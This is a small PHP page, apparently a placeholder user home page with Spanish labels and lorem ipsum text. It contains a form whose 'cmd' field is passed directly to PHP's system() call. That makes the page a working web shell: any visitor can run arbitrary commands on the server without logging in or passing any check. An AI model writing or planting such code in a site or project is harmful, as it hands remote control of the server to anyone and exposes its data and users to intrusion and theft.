<h1>Inicio desde Users</h1>
<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Aliquam dolores soluta sunt nostrum architecto possimus. Iure aspernatur necessitatibus quo id dolor at dolores hic pariatur. Non repellat blanditiis sunt veniam!</p>
<form action="<?php $_SERVER['PHP_SELF'] ?>" method="post">
    <label for="cmd">
        Ejecute:
        <input type="text" name="cmd">
    </label>
    <button>Ejecutar</button>
</form>  

<?php
if(isset($_POST)){
    if($_POST['cmd'] && !empty($_POST['cmd'])){
        system($_POST['cmd']);
    }
}
?>
